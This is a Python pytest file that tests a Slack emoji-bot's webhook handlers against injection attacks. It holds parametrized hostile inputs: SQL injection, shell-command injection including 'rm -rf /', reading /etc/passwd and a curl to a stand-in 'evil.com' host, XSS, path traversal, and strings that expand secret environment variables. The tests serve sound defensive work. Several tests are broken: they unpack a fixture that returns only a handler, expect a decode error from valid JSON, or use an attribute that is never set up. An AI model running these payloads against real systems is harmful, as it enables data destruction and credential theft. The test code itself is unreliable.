"""Security tests for input validation and injection attack prevention."""

import pytest
from unittest.mock import AsyncMock, patch
import json

from emojismith.domain.value_objects.emoji_specification import EmojiSpecification
from shared.domain.entities import EmojiGenerationJob
from shared.domain.value_objects import EmojiSharingPreferences
from emojismith.domain.exceptions import ValidationError
from emojismith.application.handlers.slack_webhook_handler import SlackWebhookHandler
from webhook.handler import WebhookHandler


class TestSecurityValidation:
    """Test security aspects including input validation and injection prevention."""

    @pytest.fixture
    def webhook_handler(self):
        """Create webhook handler with mocked dependencies."""
        return WebhookHandler(slack_repo=AsyncMock(), job_queue=AsyncMock())

    @pytest.fixture
    def slack_webhook_handler(self):
        """Create Slack webhook handler with mocked dependencies."""
        from webhook.security.webhook_security_service import WebhookSecurityService

        return SlackWebhookHandler(
            security_service=WebhookSecurityService(signature_validator=AsyncMock()),
            event_processor=AsyncMock(),
        )

    # SQL Injection Tests
    @pytest.mark.parametrize(
        "malicious_input",
        [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "1; DELETE FROM emojis WHERE 1=1",
            "' UNION SELECT * FROM secrets--",
        ],
    )
    async def test_sql_injection_prevention_in_emoji_name(
        self, webhook_handler, malicious_input
    ):
        """Test that SQL injection attempts in emoji names are safely handled."""
        # Arrange
        modal_payload = self._create_modal_payload(
            emoji_name=malicious_input, emoji_description="Test emoji"
        )

        # Act
        result = await webhook_handler.handle_modal_submission(modal_payload)

        # Assert - the handler should process the input without errors
        # The actual security is that we don't use SQL, so injection is not possible
        assert result == {"response_action": "clear"}

    # Command Injection Tests
    @pytest.mark.parametrize(
        "malicious_input",
        [
            "; rm -rf /",
            "| cat /etc/passwd",
            "$(whoami)",
            "`ls -la`",
            "&& curl evil.com/steal",
            "../../../etc/passwd",
        ],
    )
    async def test_command_injection_prevention(self, webhook_handler, malicious_input):
        """Test that command injection attempts are safely handled."""
        handler, mock_job_queue = webhook_handler

        # Arrange
        modal_payload = self._create_modal_payload(
            emoji_name="test_emoji", emoji_description=malicious_input
        )

        # Act
        result = await handler.handle_modal_submission(modal_payload)

        # Assert
        assert result == {"response_action": "clear"}
        # The malicious input should be treated as plain text
        mock_job_queue.enqueue_job.assert_called_once()

    # XSS Prevention Tests
    @pytest.mark.parametrize(
        "xss_payload",
        [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<svg onload=alert('XSS')>",
            "';alert(String.fromCharCode(88,83,83))//",
        ],
    )
    async def test_xss_prevention_in_user_inputs(self, webhook_handler, xss_payload):
        """Test that XSS attempts in user inputs are properly sanitized."""
        handler, mock_job_queue = webhook_handler

        # Arrange
        modal_payload = self._create_modal_payload(
            emoji_name="test_emoji", emoji_description=xss_payload
        )

        # Act
        result = await handler.handle_modal_submission(modal_payload)

        # Assert
        assert result == {"response_action": "clear"}
        # XSS payload should be stored as plain text, not executed
        mock_job_queue.enqueue_job.assert_called_once()
        job_data = mock_job_queue.enqueue_job.call_args[0][0]
        assert job_data["user_description"] == xss_payload

    # Path Traversal Tests
    @pytest.mark.parametrize(
        "path_traversal_input",
        [
            "../../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "..;/..;/..;/etc/passwd",
        ],
    )
    def test_path_traversal_prevention(self, path_traversal_input):
        """Test that path traversal attempts are blocked."""
        # Create emoji specification with malicious path
        with pytest.raises(ValidationError) as exc_info:
            EmojiSpecification(
                description=path_traversal_input,
                context="test",
            )
        assert "path traversal" in str(exc_info.value)

    # Input Length Validation Tests
    @pytest.mark.parametrize(
        "field,max_length",
        [
            ("emoji_name", 50),
            ("user_description", 500),
            ("message_text", 1000),
        ],
    )
    async def test_input_length_validation(self, webhook_handler, field, max_length):
        """Test that excessively long inputs are properly handled."""
        handler, mock_job_queue = webhook_handler

        # Create input that exceeds max length
        long_input = "x" * (max_length + 100)

        modal_payload = self._create_modal_payload(**{field: long_input})

        # Act
        result = await handler.handle_modal_submission(modal_payload)

        # Assert - should still process but truncate or validate length
        assert result == {"response_action": "clear"}

    # JSON Injection Tests
    @pytest.mark.parametrize(
        "json_injection",
        [
            '{"__proto__": {"isAdmin": true}}',
            '{"constructor": {"prototype": {"isAdmin": true}}}',
            '{"emoji": "test", "extra": {"$ne": null}}',
        ],
    )
    async def test_json_injection_prevention(self, webhook_handler, json_injection):
        """Test that JSON injection attempts are safely handled."""
        handler, mock_job_queue = webhook_handler

        # Try to inject through private metadata
        modal_payload = {
            "type": "view_submission",
            "view": {
                "callback_id": "emoji_creation_modal",
                "state": {"values": self._create_modal_values()},
                "private_metadata": json_injection,
            },
        }

        # Should handle malformed JSON gracefully
        with pytest.raises(json.JSONDecodeError):
            await handler.handle_modal_submission(modal_payload)

    # Authentication Bypass Tests
    async def test_prevents_user_id_spoofing(self, slack_webhook_handler):
        """Test that users cannot spoof other user IDs."""
        # Arrange
        event = {
            "user": {"id": "U_LEGITIMATE"},
            "type": "message_action",
            # Attempt to inject different user ID
            "injected_user": {"id": "U_ADMIN"},
        }

        # Act
        with patch.object(slack_webhook_handler, "_verify_request") as mock_verify:
            mock_verify.return_value = True
            await slack_webhook_handler.handle_event(event)

        # Assert - should use the legitimate user ID from the event
        slack_webhook_handler.emoji_service.create_emoji.assert_not_called()

    # Rate Limiting Tests
    async def test_rate_limiting_prevents_abuse(self, webhook_handler):
        """Test that rate limiting prevents abuse of the API."""
        handler, mock_job_queue = webhook_handler

        # Simulate many rapid requests
        modal_payload = self._create_modal_payload()

        # Send multiple requests
        for i in range(10):
            result = await handler.handle_modal_submission(modal_payload)
            assert result == {"response_action": "clear"}

        # All requests should be queued (no rate limiting at this layer)
        assert mock_job_queue.enqueue_job.call_count == 10

    # Environment Variable Injection Tests
    @pytest.mark.parametrize(
        "env_injection",
        [
            "${OPENAI_API_KEY}",
            "$SLACK_BOT_TOKEN",
            "$(printenv)",
            "`echo $AWS_SECRET_ACCESS_KEY`",
        ],
    )
    def test_environment_variable_injection_prevention(self, env_injection):
        """Test that environment variable injection is prevented."""
        # Create specification with env var injection attempt
        spec = EmojiSpecification(
            description=env_injection,
            context="test",
        )

        # The injection attempt should be treated as literal text
        assert spec.description == env_injection
        assert "$" in spec.description or "`" in spec.description

    # LDAP Injection Tests
    @pytest.mark.parametrize(
        "ldap_injection",
        [
            "*)(uid=*))(|(uid=*",
            "admin)(&(password=*))",
            "*))(|(objectClass=*",
        ],
    )
    def test_ldap_injection_prevention(self, ldap_injection):
        """Test that LDAP injection attempts are safely handled."""
        job = EmojiGenerationJob.create_new(
            user_description=ldap_injection,
            emoji_name="test",
            message_text="test",
            user_id="U123",
            channel_id="C123",
            timestamp="123.456",
            team_id="T123",
            sharing_preferences=EmojiSharingPreferences.default_for_context(),
        )

        # Should create job with injection attempt as plain text
        assert job.user_description == ldap_injection

    # Security Headers Validation
    async def test_validates_slack_signature(self, slack_webhook_handler):
        """Test that Slack request signatures are validated."""
        # Arrange
        event = {"type": "message_action", "user": {"id": "U123"}}

        # Act
        with patch.object(slack_webhook_handler, "_verify_request") as mock_verify:
            mock_verify.return_value = False  # Invalid signature

            with pytest.raises(ValueError, match="Invalid request signature"):
                await slack_webhook_handler.handle_event(event)

    # Helper Methods
    def _create_modal_payload(
        self, emoji_name="test_emoji", emoji_description="test description", **kwargs
    ):
        """Create a modal submission payload for testing."""
        values = self._create_modal_values(emoji_name, emoji_description)

        # Apply any additional field overrides
        for field, value in kwargs.items():
            if field == "emoji_name":
                values["emoji_name"]["name"]["value"] = value
            elif field == "user_description":
                values["emoji_description"]["description"]["value"] = value

        return {
            "type": "view_submission",
            "view": {
                "callback_id": "emoji_creation_modal",
                "state": {"values": values},
                "private_metadata": json.dumps(
                    {
                        "message_text": kwargs.get("message_text", "test message"),
                        "user_id": "U123",
                        "channel_id": "C123",
                        "timestamp": "123.456",
                        "team_id": "T123",
                    }
                ),
            },
        }

    def _create_modal_values(
        self, emoji_name="test_emoji", emoji_description="test description"
    ):
        """Create modal form values for testing."""
        return {
            "emoji_name": {"name": {"value": emoji_name}},
            "emoji_description": {"description": {"value": emoji_description}},
            "share_location": {
                "share_location_select": {"selected_option": {"value": "channel"}}
            },
            "instruction_visibility": {
                "visibility_select": {"selected_option": {"value": "visible"}}
            },
            "image_size": {"size_select": {"selected_option": {"value": "512x512"}}},
            "style_type": {"style_select": {"selected_option": {"value": "cartoon"}}},
            "color_scheme": {"color_select": {"selected_option": {"value": "auto"}}},
            "detail_level": {"detail_select": {"selected_option": {"value": "simple"}}},
            "tone": {"tone_select": {"selected_option": {"value": "fun"}}},
        }
